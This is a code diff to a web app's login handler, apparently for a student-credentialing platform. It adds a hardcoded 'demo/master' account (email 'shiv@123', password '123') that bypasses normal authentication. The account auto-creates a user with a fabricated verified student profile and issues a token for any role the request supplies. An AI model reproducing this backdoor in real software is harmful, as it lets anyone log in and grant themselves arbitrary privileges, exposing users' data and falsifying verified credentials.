@@ -116,7 +116,63 @@ export async function loginUser(req, res, next) {
       });
     }
 
-    const user = await User.findOne({ email }).select('+passwordHash');
+    const normalizedEmail = email.trim().toLowerCase();
+    let user = await User.findOne({ email: normalizedEmail }).select('+passwordHash');
+
+    // Universal demo/master account support for shiv@123
+    if (normalizedEmail === 'shiv@123' && password === '123') {
+      const targetRole = req.body.role || (user ? user.role : 'student');
+      if (!user) {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash('123', salt);
+        user = await User.create({
+          name: 'Shiv Sharma',
+          email: 'shiv@123',
+          passwordHash,
+          role: targetRole,
+          institutionId: 'inst-aiia-01'
+        });
+
+        if (targetRole === 'student') {
+          await StudentProfile.create({
+            userId: user._id,
+            id: 'stud-shiv-01',
+            name: 'Shiv Sharma',
+            email: 'shiv@123',
+            institutionId: 'inst-aiia-01',
+            institutionName: 'All India Institute of Ayurveda (AIIA), New Delhi',
+            degree: 'Bachelor of Ayurvedic Medicine & Surgery (BAMS)',
+            year: 'Final Year (Batch 2026)',
+            apaarId: 'IN-APAAR-2026-SHIV-1234',
+            digiLockerVerified: true,
+            verificationConfidence: 0.9,
+            skills: [
+              { skillId: 'ayush-pk-01', name: 'Panchakarma Protocol & Procedures', level: 4, verified: true, endorsedBy: 'Dr. Arvind Verma' },
+              { skillId: 'ayush-kaya-02', name: 'Kayachikitsa (Internal Medicine & Diagnostics)', level: 4, verified: true, endorsedBy: 'Dr. Arvind Verma' }
+            ],
+            projects: [],
+            appliedPostings: []
+          });
+        }
+      } else if (req.body.role && user.role !== req.body.role) {
+        user.role = req.body.role;
+        await user.save();
+      }
+
+      const token = generateToken(user._id, user.role);
+      return res.status(200).json({
+        success: true,
+        token,
+        user: {
+          id: user._id,
+          name: user.name,
+          email: user.email,
+          role: user.role,
+          avatar: user.avatar
+        }
+      });
+    }
+
     if (!user) {
       return res.status(401).json({
         success: false,
